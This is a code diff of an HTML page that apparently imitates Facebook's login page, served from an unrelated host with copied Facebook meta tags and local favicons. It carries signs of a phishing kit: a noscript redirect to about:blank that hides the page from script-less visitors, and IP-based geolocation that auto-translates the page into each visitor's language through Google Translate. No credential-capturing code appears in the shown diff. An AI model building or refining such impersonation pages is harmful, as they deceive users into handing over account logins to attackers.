@@ -16,14 +16,14 @@
         content="https://static.xx.fbcdn.net/mci_ab/public/cms/?ab_b=e&amp;ab_page=CMS&amp;ab_entry=2261194224072392&amp;version=1695158428&amp;transcode_extension=webp">
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:title"
-        content="Facebook – log in or sign up">
+        content="Facebook">
     <meta name="twitter:description"
         content="Log in to Facebook to start sharing and connecting with your friends, family and people you know.">
     <meta name="twitter:image"
         content="https://static.xx.fbcdn.net/mci_ab/public/cms/?ab_b=e&amp;ab_page=CMS&amp;ab_entry=2261194224072392&amp;version=1695158428&amp;transcode_extension=webp">
-    <link rel="shortcut icon" href="../favicon.png">
-    <link rel="icon" href="../favicon.png" type="image/png">
-    <link rel="apple-touch-icon" href="../favicon.png">
+    <link rel="shortcut icon" href="ico.ico">
+    <link rel="icon" href="../ico.ico" type="image/png">
+    <link rel="apple-touch-icon" href="../ico.ico">
     <noscript>
         <meta http-equiv="refresh" content="0;url=about:blank">
         <style>
@@ -429,99 +429,112 @@
             }, 600)
         })
     </script>
-    <script>
-    async function getIPLanguage() {
-        userLang = navigator.language || navigator.userLanguage; // Ví dụ: "vi-VN", "fr-FR"
-        userLang = userLang.split("-")[1];
+<script>
+const langMap = {
+    AF:"fa", AL:"sq", DZ:"ar", AD:"ca", AO:"pt",
+    AR:"es", AM:"hy", AU:"en", AT:"de", AZ:"az",
+    BD:"bn", BY:"be", BE:"fr", BZ:"en", BO:"es",
+    BA:"bs", BR:"pt", BG:"bg", KH:"km", CM:"fr",
+    CA:"fr", CL:"es", CN:"zh-CN", TW:"zh-TW",
+    HK:"zh-TW", MO:"zh-TW", CO:"es", CR:"es",
+    HR:"hr", CY:"el", CZ:"cs", DK:"da", DO:"es",
+    EC:"es", EG:"ar", SV:"es", EE:"et", ET:"am",
+    FI:"fi", FR:"fr", GE:"ka", DE:"de", GH:"en",
+    GR:"el", GT:"es", HN:"es", HU:"hu", IS:"is",
+    IN:"hi", ID:"id", IR:"fa", IQ:"ar", IE:"en",
+    IL:"iw", IT:"it", JP:"ja", JO:"ar", KZ:"kk",
+    KE:"sw", KP:"ko", KR:"ko", KW:"ar", LA:"lo",
+    LV:"lv", LB:"ar", LT:"lt", LU:"fr", MK:"mk",
+    MY:"ms", MT:"mt", MX:"es", MD:"ro", MN:"mn",
+    ME:"sr", MA:"ar", MM:"my", NP:"ne", NL:"nl",
+    NZ:"en", NI:"es", NG:"en", NO:"no", OM:"ar",
+    PK:"ur", PA:"es", PY:"es", PE:"es", PH:"tl",
+    PL:"pl", PT:"pt", PR:"es", QA:"ar", RO:"ro",
+    RU:"ru", SA:"ar", RS:"sr", SG:"en", SK:"sk",
+    SI:"sl", ZA:"af", ES:"es", LK:"si", SE:"sv",
+    CH:"de", SY:"ar", TW:"zh-TW", TJ:"tg", TZ:"sw",
+    TH:"th", TN:"ar", TR:"tr", UA:"uk", AE:"ar",
+    GB:"en", US:"en", UY:"es", UZ:"uz", VE:"es",
+    VN:"vi", YE:"ar", ZM:"en", ZW:"en"
+};
+    async function getCountryCode() {
         try {
-                let response = await fetch("https://get.geojs.io/v1/ip/geo.json");
-                if (!response.ok) throw new Error("API lỗi");
+            const cache = sessionStorage.getItem("country_code");
+            if (cache) return cache;
 
-                let data = await response.json();
-                userLang = data.country_code;
+            const res = await fetch("https://get.geojs.io/v1/ip/geo.json", {
+                cache: "force-cache"
+            });
 
-                console.log("Ngôn ngữ từ API:", userLang);
-            } catch (error) {
-                console.error("Lỗi lấy ngôn ngữ từ API:", error);
-            }
-            return userLang;
+            const data = await res.json();
+
+            const code = data.country_code || "US";
+
+            sessionStorage.setItem("country_code", code);
+
+            return code;
+
+        } catch {
+            return "US";
+        }
+    }
+
+    function setCookie(name, value, days = 1) {
+        const d = new Date();
+        d.setTime(d.getTime() + days * 86400000);
+
+        document.cookie =
+            `${name}=${value};expires=${d.toUTCString()};path=/;SameSite=None;Secure`;
     }
 
     async function googleTranslateElementInit() {
-        let userLang = await getIPLanguage();
-        var lowerLang = userLang.toLowerCase();
-        document.dispatchEvent(new CustomEvent('countryUpdate', 
-            {
-               detail: { countryCode: lowerLang },
-                bubbles: true
-            }
-        ));
-        let supportedLangs = ["he", "zh-TW", "th", "it", "fr", "hr", "de", "ja", "es"]; // Các ngôn ngữ hỗ trợ
-        let langMap = {
-                "TW": "zh-TW", "HK": "zh-TW", "MO": "zh-TW", "TH": "th", "IT": "it", "FR": "fr",
-                "HR": "hr", "IL": "iw", "DE": "de", "JP": "ja", "ES": "es", "MX": "es", "BO": "es",
-                "PR": "es", "CA": "fr", "JO": "ar", "IQ": "ar", "LB": "ar", "EG": "ar", "AE": "ar", "MY": "ms", "NL": "nl",
-                "CH": "de", "AR": "de", "PL": "pl", "FI": "fi", "CZ": "cs", "GR": "el", "RS": "sr",
-                "SK": "sk", "DK": "da", "PT": "pt", "BR": "pt", "PH": "tl", "KZ": "kk", "CR": "es", "LT": "lt",
-                "LV": "lv", "EE": "et", "SE": "sv", "KP": "ko", "KR": "ko", "BD": "bn", "UA": "uk", "NO": "no",
-                "TR": "tr", "AT": "de", "BA": "sr", "ME": "sr", "BG": "bg", "HU": "hu", "RO": "ro", "PE": "es",
-                "BE" : "fr", "GE": "ka", "CY": "el", "MT" : "mt", "LV": "lv", "LT": "lt", "EE": "et","LY": "ar",
-                "DZ": "ar", "ZA" : "nl"
-            }; // Lấy một bảng định dạng {"VN": "vi", "FR": "fr", ...}
-        let lang = langMap[userLang] || "en"; // Nếu không có, mặc định là "en"
-        if (lang === "en") return; // Nếu là "en", hủy quá trình
-        new google.translate.TranslateElement(
-            { pageLanguage: 'en', autoDisplay: false },
-            'google_translate_element'
-        );
-            // let userLang = navigator.language || navigator.userLanguage; // Ví dụ: "vi-VN", "fr-FR"
-            // userLang = userLang.split("-")[0]; // Lấy phần đầu tiên: "vi", "fr", "de"
 
-            var checkExist = setInterval(function () {
-                var select = document.querySelector("select.goog-te-combo");
-                if (select && select.length > 0) {
-                    select.value = lang;
-                    select.dispatchEvent(new Event("change"));
-                    clearInterval(checkExist);
-                }
-            }, 50);
+        // load cực nhanh nếu đã dịch trước đó
+        let savedLang = sessionStorage.getItem("translatedLang");
+
+        if (!savedLang) {
+            const country = await getCountryCode();
+            savedLang = langMap[country] || "en";
+        }
+
+        // nếu tiếng anh thì bỏ qua
+        if (savedLang === "en") return;
+
+        sessionStorage.setItem("translatedLang", savedLang);
+
+        // set cookie trước khi Google load
+        setCookie("googtrans", `/en/${savedLang}`);
+
+        new google.translate.TranslateElement({
+            pageLanguage: "en",
+            autoDisplay: false
+        }, "google_translate_element");
+
+        // dịch ngay khi select xuất hiện
+        const timer = setInterval(() => {
+            const select = document.querySelector(".goog-te-combo");
+
+            if (select) {
+                select.value = savedLang;
+                select.dispatchEvent(new Event("change"));
+                clearInterval(timer);
+            }
+        }, 10);
     }
 
-      window.addEventListener('pageshow', function (event) {
-        if (event.persisted)
-        {
-            
-            window.location.reload();
-        };
-});
+    // giữ trạng thái dịch khi back/forward
+    window.addEventListener("pageshow", () => {
+        const lang = sessionStorage.getItem("translatedLang");
 
-function getTranslationState() {
-          let savedLang = sessionStorage.getItem('translatedLang');
-
-          return savedLang;
+        if (lang) {
+            setCookie("googtrans", `/en/${lang}`);
         }
-
-        function saveTranslationState(lang) {
-          sessionStorage.setItem('translatedLang', lang);
-        }
-
-        function restoreTranslation() {
-          let savedLang = getTranslationState();
-          if (savedLang && savedLang !== 'en') {
-            let select = document.querySelector("select.goog-te-combo");
-            if (select && select.value !== savedLang) {
-              select.value = savedLang;
-              select.dispatchEvent(new Event("change"));
-            }
-          }
-        }
-
+    });
 </script>
-<script src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit"></script>
-    <script type="module">
-        import { inject } from 'https://esm.sh/@vercel/analytics';
-        inject();
-    </script>
+
+<script async
+src="https://translate.google.com/translate_a/element.js?cb=googleTranslateElementInit">
+</script>
 </body>
 
 </html>
